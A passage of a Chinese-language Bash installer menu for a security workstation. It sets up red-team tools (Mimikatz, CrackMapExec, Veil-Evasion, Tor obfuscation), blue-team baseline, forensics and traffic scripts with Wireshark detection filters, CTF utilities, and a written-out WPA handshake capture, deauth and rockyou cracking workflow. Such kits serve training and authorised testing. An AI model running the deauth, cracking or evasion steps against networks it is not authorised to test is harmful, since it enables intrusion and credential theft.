# ═══════════════════════════════════════════════════════
#  快速全端口扫描模板 · Mr.li8848
#  用法: ./quick-scan.sh <目标IP或网段>
# ═══════════════════════════════════════════════════════
set -e
TARGET="${1:?用法: $0 <IP/网段>}"
OUTNAME="nmap-allports-$(echo "$TARGET" | tr '/' '_')"
echo "[*] 扫描目标: $TARGET"
nmap -T4 -p- --min-rate=10000 -oA "$OUTNAME" "$TARGET"
echo "[*] 结果已保存: ${OUTNAME}.*"
NMQUICK
    chmod +x /opt/nmap-scripts/quick-scan.sh

    # 服务版本 + 漏洞脚本扫描
    cat > /opt/nmap-scripts/service-scan.sh << 'NMSVC'
#!/bin/bash
# ═══════════════════════════════════════════════════════
#  服务版本 & 漏洞扫描模板 · Mr.li8848
#  用法: ./service-scan.sh <目标IP>
# ═══════════════════════════════════════════════════════
set -e
TARGET="${1:?用法: $0 <IP>}"
echo "[*] 扫描目标: $TARGET"
nmap -sV -sC -O -p- --script=vuln --script-timeout=5m \
     -oA "nmap-service-${TARGET}" "$TARGET"
echo "[*] 结果已保存: nmap-service-${TARGET}.*"
NMSVC
    chmod +x /opt/nmap-scripts/service-scan.sh

    step_ok "Nmap 扫描模板 → /opt/nmap-scripts/"

    echo ""

    # 目录爆破
    info_card "📂" "目录爆破 & 爬虫" \
        "gobuster    — 目录/DNS/VHost 多模式爆破" \
        "ffuf        — 超高速 Web Fuzzer" \
        "dirsearch   — Python 目录扫描器，支持递归" \
        "feroxbuster — Rust 编写，并发性能优异"

    apt install -y gobuster ffuf dirsearch feroxbuster 2>/dev/null || true
    step_ok "目录爆破工具已就绪"

    press_enter
}

# ── 2.3  漏洞利用环境 ──
red_team_exploit() {
    section_title "2.3  漏洞利用环境"

    # Docker 靶场
    echo -e "   ${BOLD}🐳  Docker 漏洞靶场${NC}"
    echo ""

    if confirm_default_yes "安装 Docker 并拉取靶场镜像？"; then
        if ! command -v docker &>/dev/null; then
            step_info "未检测到 Docker，正在安装..."
            curl -fsSL https://get.docker.com | bash 2>/dev/null || \
                apt install -y docker.io 2>/dev/null || true
            systemctl enable docker --now 2>/dev/null || true
            step_ok "Docker 已安装"
        else
            step_done "Docker 已就绪"
        fi

        echo ""
        echo -e "   ${BOLD}选择要拉取的靶场:${NC}"
        echo -e "     ${CYAN}1${NC})  DVWA       — PHP/MySQL 经典漏洞练习平台"
        echo -e "     ${CYAN}2${NC})  WebGoat    — OWASP 官方 Java Web 安全教学"
        echo -e "     ${CYAN}3${NC})  Vulhub     — 漏洞复现合集 (200+ 环境，推荐)"
        echo -e "     ${CYAN}4${NC})  Spring     — Spring 系列漏洞靶场"
        echo -e "     ${CYAN}5${NC})  全部拉取"
        echo -e "     ${CYAN}0${NC})  跳过"
        echo ""
        read -p "   $(echo -e "请选择 [0-5]: ")" LAB_CHOICE

        case "$LAB_CHOICE" in
            1)
                docker pull vulnerables/web-dvwa 2>/dev/null && step_ok "DVWA 已拉取"
                step_info "启动: docker run -d -p 8080:80 vulnerables/web-dvwa"
                ;;
            2)
                docker pull webgoat/goatandwolf 2>/dev/null && step_ok "WebGoat 已拉取"
                step_info "启动: docker run -d -p 8080:8080 -p 9090:9090 webgoat/goatandwolf"
                ;;
            3)
                if [ ! -d /opt/vulhub ]; then
                    git clone --depth 1 https://github.com/vulhub/vulhub.git /opt/vulhub 2>/dev/null && \
                        step_ok "Vulhub → /opt/vulhub (200+ 漏洞环境)"
                else
                    step_done "Vulhub 已存在"
                fi
                step_info "使用: cd /opt/vulhub/<漏洞目录> && docker-compose up -d"
                ;;
            4)
                docker pull vulfocus/spring-core-rce-2022-03-29 2>/dev/null && \
                    step_ok "Spring 漏洞靶场已拉取"
                ;;
            5)
                docker pull vulnerables/web-dvwa 2>/dev/null || true
                docker pull webgoat/goatandwolf 2>/dev/null || true
                [ ! -d /opt/vulhub ] && \
                    git clone --depth 1 https://github.com/vulhub/vulhub.git /opt/vulhub 2>/dev/null || true
                step_ok "全部靶场拉取完成"
                ;;
            *) step_warn "已跳过靶场拉取" ;;
        esac
    fi

    echo ""

    # POC 框架
    info_card "🧪" "POC / 漏洞扫描框架" \
        "Nuclei  — 基于 YAML 模板的快速漏洞扫描器 (ProjectDiscovery)" \
        "Xray    — 长亭科技出品的社区版被动扫描器"

    if confirm_default_yes "安装 Nuclei + 更新模板？"; then
        apt install -y nuclei 2>/dev/null || true
        nuclei -ut 2>/dev/null || true
        step_ok "Nuclei 已安装，模板已更新"
    fi

    if [ ! -f /opt/xray/xray ]; then
        mkdir -p /opt/xray
        step_info "Xray 社区版需手动下载: https://github.com/chaitin/xray/releases"
    else
        step_done "Xray 已存在"
    fi

    press_enter
}

# ── 2.4  内网渗透 ──
red_team_internal() {
    section_title "2.4  内网渗透工具"

    info_card "🏴" "内网横向移动套件" \
        "BloodHound     — AD 域关系可视化，分析攻击路径" \
        "CrackMapExec   — 内网批量漏洞利用瑞士军刀" \
        "Impacket       — Windows 网络协议 Python 实现套件" \
        "Mimikatz       — Windows 凭据转储神器"

    if confirm_default_yes "安装内网渗透工具？"; then
        apt install -y bloodhound crackmapexec neo4j 2>/dev/null || true
        apt install -y impacket-scripts python3-impacket 2>/dev/null || true
        step_ok "BloodHound / CrackMapExec / Impacket 已安装"

        # Mimikatz
        if [ ! -d /opt/mimikatz ]; then
            git clone --depth 1 https://github.com/gentilkiwi/mimikatz.git /opt/mimikatz 2>/dev/null && \
                step_ok "Mimikatz → /opt/mimikatz" || \
                step_warn "Mimikatz 克隆失败"
        else
            step_done "Mimikatz 已存在"
        fi

        # Sharp 系列
        mkdir -p /opt/sharp-tools
        step_info "Sharp 系列 (SharpHound/SharpView/Rubeus 等) 需在 Windows 平台编译"
        step_info "参考: https://github.com/BloodHoundAD/SharpHound"

        step_ok "内网渗透工具配置完成"
    fi

    press_enter
}

# ── 2.5  后渗透 / 持久化 ──
red_team_persist() {
    section_title "2.5  后渗透 / 持久化工具"

    echo -e "   ${RED}${BOLD}⛔ 以下工具仅限授权的红队演练/安全评估使用！${NC}"
    echo ""

    info_card "🎯" "Payload 生成" \
        "msfpc       — MSFvenom Payload Creator，快速生成各类 Payload" \
        "Veil-Evasion — 免杀 Payload 生成框架"

    apt install -y msfpc veil-evasion 2>/dev/null || true

    echo ""

    info_card "🔗" "权限维持 & 流量混淆" \
        "PayloadsAllTheThings — 权限维持技巧大全 (GitHub)" \
        "Tor + obfs4proxy     — 洋葱路由流量混淆" \
        "参考: https://github.com/swisskyrepo/PayloadsAllTheThings"

    apt install -y tor obfs4proxy 2>/dev/null || true
    mkdir -p /opt/persistence-scripts

    step_ok "后渗透工具准备完成"
    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：三、安全运维 / 蓝队 / 等保
# ////////////////////////////////////////////////////////////////////////////

section_three() {
    while true; do
        banner "三、安全运维 / 蓝队 / 等保"

        echo -e "   ${BOLD}请选择子模块:${NC}"
        echo ""
        echo -e "   ${CYAN}1${NC})  漏洞扫描器部署    OpenVAS · Nessus · Xray"
        echo -e "   ${CYAN}2${NC})  等保核查 & 基线    Linux/Windows 安全基线检查脚本"
        echo -e "   ${CYAN}3${NC})  流量分析工具      Wireshark 过滤器 · tcpdump 抓包模板"
        echo -e "   ${CYAN}4${NC})  应急响应工具包    病毒查杀 · 取证收集 · 日志分析"
        echo ""
        echo -e "   ${DIM}0${NC})  ${DIM}← 返回主菜单${NC}"
        echo ""

        local SUB
        read -p "   $(echo -e "请选择 [0-4]: ")" SUB

        case "$SUB" in
            1) blue_scanners ;;
            2) blue_compliance ;;
            3) blue_traffic ;;
            4) blue_incident ;;
            0) return ;;
            *) echo -e "   ${RED}无效选项，请重新输入${NC}"; sleep 0.5 ;;
        esac
    done
}

# ── 3.1  漏洞扫描器 ──
blue_scanners() {
    section_title "3.1  漏洞扫描器部署"

    # OpenVAS
    info_card "🟢" "OpenVAS (Greenbone)" \
        "开源漏洞评估系统，Nessus 的开源替代品" \
        "安装体积约 2GB，初次配置需 10-30 分钟" \
        "Web 管理界面默认端口 9392"

    if confirm_default_no "安装 OpenVAS？"; then
        apt install -y openvas 2>/dev/null && \
            gvm-setup 2>/dev/null && \
            step_ok "OpenVAS 已安装，访问 https://localhost:9392" || \
            step_warn "OpenVAS 安装失败"
    fi

    echo ""

    # Nessus
    info_card "🔵" "Nessus" \
        "商业漏洞扫描器 (免费版限制 16 个 IP)" \
        "下载地址: https://www.tenable.com/downloads/nessus" \
        "安装命令: sudo dpkg -i Nessus-*.deb && sudo systemctl start nessusd"

    echo ""

    # Xray
    info_card "🟣" "Xray (长亭科技)" \
        "社区版被动扫描器，与 Burp Suite 配合使用" \
        "下载地址: https://github.com/chaitin/xray/releases"
    mkdir -p /opt/xray
    [ -f /opt/xray/xray ] && step_done "Xray 已存在" || \
        step_info "请手动下载 Xray 可执行文件到 /opt/xray/"

    press_enter
}

# ── 3.2  等保核查 & 基线 ──
blue_compliance() {
    section_title "3.2  等保核查 & 安全基线检查"

    mkdir -p /opt/security-check

    # Linux 基线检查
    cat > /opt/security-check/linux-baseline.sh << 'BASELINE'
#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  Linux 安全基线检查脚本 · Mr.li8848
#  用途: 等保 2.0 / 安全自查
#  用法: sudo bash linux-baseline.sh
# ═══════════════════════════════════════════════════════════════
set -e
HOST="$(hostname)"
TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
OUTPUT="linux-baseline-${HOST}-${TIMESTAMP}.txt"

{
    echo "═══════════════════════════════════════════"
    echo "  Linux 安全基线检查报告"
    echo "  主机: ${HOST}"
    echo "  时间: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "═══════════════════════════════════════════"
    echo ""

    echo "▶ [1/7] 账号与权限"
    echo "  UID=0 特权用户:"
    awk -F: '($3==0){printf "    - %s\n", $1}' /etc/passwd
    echo "  空密码账户:"
    awk -F: '($2==""){printf "    - %s (无密码!)\n", $1}' /etc/shadow 2>/dev/null || echo "    无"
    echo "  可登录用户:"
    grep -v '/nologin\|/false\|/sync\|/shutdown\|/halt' /etc/passwd | awk -F: '{printf "    - %s (shell: %s)\n", $1, $7}'

    echo ""
    echo "▶ [2/7] 密码策略"
    grep -E '^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_MIN_LEN|^PASS_WARN_AGE' /etc/login.defs 2>/dev/null || echo "  未配置"

    echo ""
    echo "▶ [3/7] SSH 安全配置"
    grep -E '^(PermitRootLogin|PasswordAuthentication|Port|PubkeyAuthentication|MaxAuthTries)' /etc/ssh/sshd_config 2>/dev/null || echo "  sshd_config 未找到"

    echo ""
    echo "▶ [4/7] 防火墙规则"
    iptables -L -n 2>/dev/null | head -20 || echo "  iptables 未配置"

    echo ""
    echo "▶ [5/7] 监听端口"
    ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

    echo ""
    echo "▶ [6/7] 关键文件权限"
    ls -la /etc/shadow /etc/passwd /etc/group /etc/sudoers 2>/dev/null

    echo ""
    echo "▶ [7/7] 异常进程 (按内存排序 Top 10)"
    ps aux --sort=-%mem | head -11

    echo ""
    echo "═══════════════════════════════════════════"
    echo "  报告生成: ${OUTPUT}"
    echo "═══════════════════════════════════════════"
} | tee "$OUTPUT"
BASELINE
    chmod +x /opt/security-check/linux-baseline.sh

    # Windows 基线检查
    cat > /opt/security-check/windows-baseline.ps1 << 'WINBL'
# ═══════════════════════════════════════════════════════════════
#  Windows 安全基线检查脚本 · Mr.li8848
#  用途: 等保 2.0 / 安全自查
#  用法: powershell -ExecutionPolicy Bypass -File windows-baseline.ps1
# ═══════════════════════════════════════════════════════════════
$HostName = hostname
$Time = Get-Date -Format "yyyyMMdd-HHmmss"
$Output = "windows-baseline-${HostName}-${Time}.txt"
Start-Transcript -Path $Output -Append

Write-Host "═══════════════════════════════════════════"
Write-Host "  Windows 安全基线检查报告"
Write-Host "  主机: ${HostName}"
Write-Host "  时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "═══════════════════════════════════════════`n"

Write-Host "▶ [1/6] 本地用户与组"
Get-LocalUser | Format-Table Name, Enabled, LastLogon -AutoSize

Write-Host "▶ [2/6] Administrators 组成员"
Get-LocalGroupMember -Group "Administrators" | Format-Table Name, ObjectClass -AutoSize

Write-Host "▶ [3/6] Windows 防火墙状态"
Get-NetFirewallProfile | Format-Table Name, Enabled -AutoSize

Write-Host "▶ [4/6] 监听端口"
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess | Sort-Object LocalPort -Unique

Write-Host "▶ [5/6] 最近安全补丁 (Top 10)"
Get-HotFix | Select-Object HotFixID, InstalledOn | Sort-Object InstalledOn -Descending | Select-Object -First 10

Write-Host "▶ [6/6] 共享文件夹"
Get-SmbShare | Format-Table Name, Path -AutoSize

Write-Host "`n═══════════════════════════════════════════"
Write-Host "  报告生成: ${Output}"
Write-Host "═══════════════════════════════════════════"
Stop-Transcript
WINBL

    step_ok "基线检查脚本已生成 → /opt/security-check/"
    echo ""
    echo -e "   ${CYAN}linux-baseline.sh${NC}     — Linux 安全基线检查"
    echo -e "   ${CYAN}windows-baseline.ps1${NC}  — Windows 安全基线检查"
    echo ""
    step_info "使用方法: 将脚本拷贝到目标机器上执行，自动生成带时间戳的检查报告"

    press_enter
}

# ── 3.3  流量分析 ──
blue_traffic() {
    section_title "3.3  流量分析工具"

    apt install -y wireshark tcpdump tshark 2>/dev/null || true
    step_ok "Wireshark / tcpdump / tshark 已安装"

    echo ""
    mkdir -p /opt/tcpdump-scripts

    # HTTP 流量监控
    cat > /opt/tcpdump-scripts/http-monitor.sh << 'TCPHTTP'
#!/bin/bash
# ═══════════════════════════════════════════════════════
#  HTTP 请求内容实时监控 · Mr.li8848
#  用法: ./http-monitor.sh [网卡名,默认 eth0]
# ═══════════════════════════════════════════════════════
IFACE="${1:-eth0}"
echo "[*] 监听 ${IFACE} 上的 HTTP 请求..."
tcpdump -i "$IFACE" -A -s 0 \
    'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
TCPHTTP
    chmod +x /opt/tcpdump-scripts/http-monitor.sh

    # DNS 监控
    cat > /opt/tcpdump-scripts/dns-monitor.sh << 'TCPDNS'
#!/bin/bash
# ═══════════════════════════════════════════════════════
#  DNS 查询实时监控 · Mr.li8848
#  用法: ./dns-monitor.sh [网卡名,默认 eth0]
# ═══════════════════════════════════════════════════════
IFACE="${1:-eth0}"
echo "[*] 监听 ${IFACE} 上的 DNS 查询..."
tcpdump -i "$IFACE" -n udp port 53
TCPDNS
    chmod +x /opt/tcpdump-scripts/dns-monitor.sh

    # Wireshark 过滤器速查表
    cat > /opt/tcpdump-scripts/wireshark-filters.txt << 'WSFILTER'
# ═══════════════════════════════════════════════════════
#  Wireshark 常用过滤器速查表 · Mr.li8848
# ═══════════════════════════════════════════════════════

# ── 协议过滤 ──
http                     # 所有 HTTP 流量
http.request             # 仅 HTTP 请求
dns                      # DNS 查询与响应
tls.handshake            # TLS 握手
tls.handshake.type == 1  # TLS Client Hello

# ── IP 过滤 ──
ip.addr == 192.168.1.1         # 来源或目标为该 IP
ip.src == 10.0.0.1             # 来源 IP
ip.dst == 10.0.0.2             # 目标 IP

# ── 排除噪声 ──
!(arp or dns or icmp or stp)

# ── 异常检测 ──
tcp.analysis.retransmission    # TCP 重传（可能网络不稳定）
tcp.analysis.duplicate_ack     # 重复 ACK
tcp.flags.reset == 1           # RST 包

# ── 安全分析 ──
http.request.uri matches "(?i)select|union|insert|script|passwd"
tcp.port == 4444               # 常见 Metasploit 端口
dns.qry.name contains "cmd"    # DNS 隧道检测
WSFILTER

    step_ok "抓包脚本 & 过滤器模板 → /opt/tcpdump-scripts/"
    echo ""
    echo -e "   ${CYAN}http-monitor.sh${NC}        — HTTP 请求实时监控"
    echo -e "   ${CYAN}dns-monitor.sh${NC}         — DNS 查询监控"
    echo -e "   ${CYAN}wireshark-filters.txt${NC}  — Wireshark 常用过滤器速查"

    press_enter
}

# ── 3.4  应急响应 ──
blue_incident() {
    section_title "3.4  应急响应工具包"

    echo -e "   ${BOLD}安装安全检测工具:${NC}"
    echo -e "   ${CYAN}chkrootkit${NC}  — Rootkit 检测"
    echo -e "   ${CYAN}rkhunter${NC}    — Rootkit 猎人"
    echo -e "   ${CYAN}lynis${NC}       — Linux 安全审计"
    echo -e "   ${CYAN}clamav${NC}      — 开源杀毒引擎"
    echo ""

    if confirm_default_yes "安装以上工具？"; then
        apt install -y chkrootkit rkhunter lynis clamav 2>/dev/null || true
        step_ok "应急检测工具已安装"
    fi

    echo ""

    # 取证收集脚本
    mkdir -p /opt/incident-response
    cat > /opt/incident-response/collect-forensics.sh << 'FORENSIC'
#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  应急取证自动收集脚本 · Mr.li8848
#  用途: 一键收集关键系统日志与状态快照
#  用法: sudo bash collect-forensics.sh
# ═══════════════════════════════════════════════════════════════
set -e

CASE_DIR="/tmp/forensics-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$CASE_DIR"

echo "[*] 开始取证收集 → ${CASE_DIR}"

# 系统日志
cp /var/log/auth.log     "$CASE_DIR/" 2>/dev/null || true
cp /var/log/syslog       "$CASE_DIR/" 2>/dev/null || true
cp /var/log/kern.log     "$CASE_DIR/" 2>/dev/null || true
cp /var/log/apt/history.log "$CASE_DIR/" 2>/dev/null || true

# 用户与登录
last          > "$CASE_DIR/last-logins.txt"
w             > "$CASE_DIR/current-users.txt"
lastb 2>/dev/null > "$CASE_DIR/failed-logins.txt" || true

# 网络
ss -tlnp      > "$CASE_DIR/listening-ports.txt" 2>/dev/null
iptables -L -n > "$CASE_DIR/iptables-rules.txt" 2>/dev/null || true
ip addr       > "$CASE_DIR/network-interfaces.txt"

# 进程
ps aux        > "$CASE_DIR/processes.txt"
lsof 2>/dev/null | head -200 > "$CASE_DIR/open-files.txt" || true

# 自启动
ls -la /etc/cron.* /var/spool/cron/ 2>/dev/null > "$CASE_DIR/cron-jobs.txt" || true
systemctl list-units --type=service --state=running 2>/dev/null > "$CASE_DIR/running-services.txt" || true

# 最近修改文件
find / -xdev -mtime -1 -type f 2>/dev/null > "$CASE_DIR/recent-files-24h.txt" || true

# 打包
ARCHIVE_NAME="forensics-$(hostname)-$(date +%Y%m%d-%H%M%S).tar.gz"
tar czf "/tmp/${ARCHIVE_NAME}" -C /tmp "$(basename "$CASE_DIR")"

echo ""
echo "═══════════════════════════════════════════"
echo "  取证包: /tmp/${ARCHIVE_NAME}"
echo "  原始目录: ${CASE_DIR}"
echo "═══════════════════════════════════════════"
FORENSIC
    chmod +x /opt/incident-response/collect-forensics.sh

    step_ok "应急取证脚本 → /opt/incident-response/collect-forensics.sh"
    step_info "使用: sudo bash /opt/incident-response/collect-forensics.sh → 自动打包取证数据"

    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：四、CTF 选手专属
# ////////////////////////////////////////////////////////////////////////////

section_four() {
    while true; do
        banner "四、CTF 竞赛选手专属"

        echo -e "   ${BOLD}请选择子模块:${NC}"
        echo ""
        echo -e "   ${CYAN}1${NC})  密码学        OpenSSL · SageMath · Z3 · RsaCtfTool"
        echo -e "   ${CYAN}2${NC})  二进制逆向    GDB+Pwndbg · Ghidra · radare2 · QEMU"
        echo -e "   ${CYAN}3${NC})  Web 攻防      sqlmap · XSSer · 编解码工具箱"
        echo -e "   ${CYAN}4${NC})  杂项 / 隐写   steghide · zsteg · binwalk · exiftool"
        echo ""
        echo -e "   ${DIM}0${NC})  ${DIM}← 返回主菜单${NC}"
        echo ""

        local SUB
        read -p "   $(echo -e "请选择 [0-4]: ")" SUB

        case "$SUB" in
            1) ctf_crypto ;;
            2) ctf_reverse ;;
            3) ctf_web ;;
            4) ctf_misc ;;
            0) return ;;
            *) echo -e "   ${RED}无效选项，请重新输入${NC}"; sleep 0.5 ;;
        esac
    done
}

# ── 4.1  密码学 ──
ctf_crypto() {
    section_title "4.1  密码学工具"

    info_card "🔐" "经典 & 现代密码学" \
        "OpenSSL     — 加解密、证书、哈希运算全能瑞士军刀" \
        "Z3 Solver   — 微软定理证明器，求解约束/SMT 问题" \
        "SageMath    — 数学神器，数论/代数/椭圆曲线一把梭" \
        "RsaCtfTool  — RSA 攻击自动化（低指数/共模/维纳等）"

    if confirm_default_yes "安装密码学工具？"; then
        apt install -y openssl 2>/dev/null || true
        pip3 install z3-solver pycryptodome gmpy2 sympy 2>/dev/null || true
        step_ok "核心密码学库已安装"
    fi

    if confirm_default_no "安装 SageMath (约 2GB，体积较大)？"; then
        apt install -y sagemath 2>/dev/null && \
            step_ok "SageMath 已安装" || \
            step_warn "SageMath 安装失败"
    fi

    # RsaCtfTool
    if [ ! -d /opt/RsaCtfTool ]; then
        git clone --depth 1 https://github.com/RsaCtfTool/RsaCtfTool.git /opt/RsaCtfTool 2>/dev/null && \
            pip3 install -r /opt/RsaCtfTool/requirements.txt 2>/dev/null || true
        step_ok "RsaCtfTool → /opt/RsaCtfTool"
    else
        step_done "RsaCtfTool 已存在"
    fi

    pip3 install ctfools 2>/dev/null || true
    step_ok "密码学工具安装完成"

    press_enter
}

# ── 4.2  二进制逆向 ──
ctf_reverse() {
    section_title "4.2  二进制逆向 & PWN"

    info_card "🔧" "逆向工程套件" \
        "GDB + Pwndbg  — 调试器 + 插件，PWN 题必备" \
        "Ghidra         — NSA 开源的 Java 反编译/逆向平台" \
        "radare2        — 命令行逆向框架，轻量高效" \
        "QEMU           — 跨架构模拟 (ARM/MIPS/PowerPC)" \
        "pwntools       — CTF PWN 瑞士军刀 Python 库"

    if confirm_default_yes "安装逆向工具？"; then
        apt install -y gdb radare2 2>/dev/null || true

        # pwndbg
        if [ ! -d /opt/pwndbg ]; then
            git clone --depth 1 https://github.com/pwndbg/pwndbg.git /opt/pwndbg 2>/dev/null && \
                (cd /opt/pwndbg && ./setup.sh 2>/dev/null) && \
                step_ok "pwndbg 已安装" || \
                step_warn "pwndbg 安装失败"
        else
            step_done "pwndbg 已存在"
        fi

        # Ghidra
        apt install -y ghidra 2>/dev/null && \
            step_ok "Ghidra 已安装" || \
            step_info "Ghidra 可从 https://github.com/NationalSecurityAgency/ghidra/releases 手动下载"

        # QEMU
        apt install -y qemu-user-static qemu-system 2>/dev/null || true

        # pwntools
        pip3 install pwntools 2>/dev/null || true

        step_ok "逆向环境安装完成"
    fi

    press_enter
}

# ── 4.3  Web 攻防 ──
ctf_web() {
    section_title "4.3  Web 攻防工具"

    info_card "🌐" "Web 安全" \
        "sqlmap  — SQL 注入自动化检测与利用" \
        "wfuzz   — Web 参数/Fuzz 暴力破解" \
        "decoder — 自定义编解码脚本 (Base64/Hex/URL/Rot13)"

    if confirm_default_yes "安装 Web 工具？"; then
        apt install -y sqlmap wfuzz 2>/dev/null || true
        step_ok "sqlmap / wfuzz 已安装"
    fi

    # 编解码工具箱
    mkdir -p /opt/ctf-utils
    cat > /opt/ctf-utils/decoder.sh << 'DECODER'
#!/bin/bash
# ═══════════════════════════════════════════════════════
#  CTF 常用编解码工具箱 · Mr.li8848
#  用法: decoder <编码类型> <待解码字符串>
#  支持: b64d b64e b32d url hex rot13 md5 sha256
# ═══════════════════════════════════════════════════════
case "$1" in
    b64d)   echo "$2" | base64 -d ;;
    b64e)   echo -n "$2" | base64 ;;
    b32d)   echo "$2" | base32 -d 2>/dev/null || python3 -c "import base64; print(base64.b32decode('$2').decode())" ;;
    url)    python3 -c "import urllib.parse; print(urllib.parse.unquote('$2'))" ;;
    urle)   python3 -c "import urllib.parse; print(urllib.parse.quote('$2'))" ;;
    hex)    echo "$2" | xxd -r -p; echo ;;
    hexe)   echo -n "$2" | xxd -p ;;
    rot13)  echo "$2" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ;;
    md5)    echo -n "$2" | md5sum | awk '{print $1}' ;;
    sha256) echo -n "$2" | sha256sum | awk '{print $1}' ;;
    *)
        echo "用法: decoder <类型> <字符串>"
        echo "类型: b64d|b64e|b32d|url|urle|hex|hexe|rot13|md5|sha256"
        echo ""
        echo "示例: decoder b64d SGVsbG8="
        echo "      decoder url '%E4%BD%A0%E5%A5%BD'"
        ;;
esac
DECODER
    chmod +x /opt/ctf-utils/decoder.sh
    step_ok "编解码工具箱 → /opt/ctf-utils/decoder.sh"

    press_enter
}

# ── 4.4  杂项 / 隐写 ──
ctf_misc() {
    section_title "4.4  杂项 & 隐写取证工具"

    info_card "🖼️" "隐写 & 文件分析" \
        "steghide    — 图像/音频隐写工具" \
        "zsteg       — PNG/BMP 隐写检测（支持 LSB 等多种方式）" \
        "exiftool    — EXIF 元数据提取/编辑" \
        "binwalk     — 固件/文件结构分析 & 提取" \
        "foremost    — 文件雕刻/数据恢复"

    if confirm_default_yes "安装杂项工具？"; then
        apt install -y steghide exiftool binwalk foremost pngcheck imagemagick 2>/dev/null || true
        apt install -y default-jre 2>/dev/null || true  # stegsolve 需要 Java
        pip3 install zsteg 2>/dev/null || true
        step_ok "杂项工具安装完成"
    fi

    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：五、无线安全
# ////////////////////////////////////////////////////////////////////////////

section_five() {
    while true; do
        banner "五、无线安全"

        echo -e "   ${BOLD}请选择子模块:${NC}"
        echo ""
        echo -e "   ${CYAN}1${NC})  无线网卡驱动    驱动安装 · 监听模式开启"
        echo -e "   ${CYAN}2${NC})  aircrack-ng 套件 抓包 · 握手包爆破 · WPS 攻击"
        echo -e "   ${CYAN}3${NC})  AP 钓鱼环境      hostapd + dnsmasq 伪造热点"
        echo ""
        echo -e "   ${DIM}0${NC})  ${DIM}← 返回主菜单${NC}"
        echo ""

        local SUB
        read -p "   $(echo -e "请选择 [0-3]: ")" SUB

        case "$SUB" in
            1) wifi_driver ;;
            2) wifi_aircrack ;;
            3) wifi_phishing ;;
            0) return ;;
            *) echo -e "   ${RED}无效选项，请重新输入${NC}"; sleep 0.5 ;;
        esac
    done
}

# ── 5.1  无线驱动 ──
wifi_driver() {
    section_title "5.1  无线网卡驱动 & 监听模式"

    echo -e "   ${YELLOW}正在检测无线网卡...${NC}"
    iwconfig 2>/dev/null | grep -E "IEEE|Mode|ESSID" || \
        echo -e "   ${DIM}未检测到无线网卡（若无 USB 网卡则正常）${NC}"

    echo ""
    info_card "📡" "常用抓包网卡芯片" \
        "rtl8812au  — 双频 2.4/5GHz USB 网卡，推荐款" \
        "rtl8187    — 经典老款芯片，仅 2.4GHz" \
        "mt76x2u    — MediaTek 芯片，部分型号支持"

    if confirm_default_yes "安装无线驱动？"; then
        apt install -y realtek-rtl88xxau-dkms realtek-rtl8188eus-dkms 2>/dev/null || true
        step_ok "无线驱动安装完成"
    fi

    echo ""
    echo -e "   ${BOLD}监听模式快速上手:${NC}"
    echo -e "   ${CYAN}# 查看无线网卡:${NC}"
    echo -e "     iwconfig"
    echo -e "   ${CYAN}# 开启监听模式 (方法一: airmon-ng):${NC}"
    echo -e "     airmon-ng start wlan0"
    echo -e "   ${CYAN}# 开启监听模式 (方法二: 手动):${NC}"
    echo -e "     ifconfig wlan0 down"
    echo -e "     iwconfig wlan0 mode monitor"
    echo -e "     ifconfig wlan0 up"
    echo -e "   ${CYAN}# 验证:${NC}"
    echo -e "     iwconfig  # 看到 Mode:Monitor 即成功"

    press_enter
}

# ── 5.2  aircrack-ng ──
wifi_aircrack() {
    section_title "5.2  aircrack-ng 全套工具"

    info_card "📶" "WiFi 安全测试套件" \
        "aircrack-ng   — WPA/WEP 密码爆破" \
        "aireplay-ng   — 包注入/Deauth 攻击" \
        "airodump-ng   — 无线网络扫描抓包" \
        "reaver/bully  — WPS PIN 暴力破解" \
        "hcxtools      — 捕获并转换握手包为 Hashcat 格式" \
        "wifite        — 自动化无线攻击脚本"

    if confirm_default_yes "安装 aircrack-ng 全套？"; then
        apt install -y aircrack-ng reaver bully hcxdumptool hcxtools 2>/dev/null || true
        apt install -y wifite wifiphisher 2>/dev/null || true
        step_ok "aircrack-ng 套件已安装"
    fi

    echo ""

    # 抓包流程脚本
    cat > /opt/wifi-capture.sh << 'WIFI'
#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  WiFi 抓包 & WPA 握手包爆破流程 · Mr.li8848
#  用法: sudo bash wifi-capture.sh [网卡名,默认 wlan0]
# ═══════════════════════════════════════════════════════════════
set -e

IFACE="${1:-wlan0}"

echo "╔═══════════════════════════════════════════╗"
echo "║  WiFi WPA 抓包 & 爆破流程                ║"
echo "╚═══════════════════════════════════════════╝"
echo ""

# Step 1: 开启监听
echo "[1/5] 清理冲突进程并开启监听模式..."
airmon-ng check kill 2>/dev/null || true
airmon-ng start "$IFACE"
MON="${IFACE}mon"
echo "      监听接口: ${MON}"

# Step 2: 扫描
echo ""
echo "[2/5] 扫描附近 WiFi 网络 (Ctrl+C 停止)..."
airodump-ng "$MON"

# Step 3: 输入目标
echo ""
read -p "  输入目标 BSSID (MAC 地址): " BSSID
read -p "  输入目标信道 (CH): " CH

# Step 4: 抓包
echo ""
echo "[3/5] 开始监听目标并等待握手包..."
echo "      另开终端执行 Deauth 加速:"
echo "      aireplay-ng -0 10 -a ${BSSID} ${MON}"
echo ""
CAPFILE="wpa-capture-${BSSID//:/-}"
airodump-ng -c "$CH" --bssid "$BSSID" -w "$CAPFILE" "$MON"

# Step 5: 爆破
echo ""
echo "[4/5] 握手包保存为: ${CAPFILE}-01.cap"
echo ""
echo "[5/5] 开始爆破 WPA 密码:"
echo "  aircrack-ng:"
echo "    aircrack-ng -w /usr/share/wordlists/rockyou.txt ${CAPFILE}-01.cap"
echo ""
echo "  Hashcat (GPU 加速推荐):"
echo "    hcxpcapngtool -o hash.hc22000 ${CAPFILE}-01.cap"
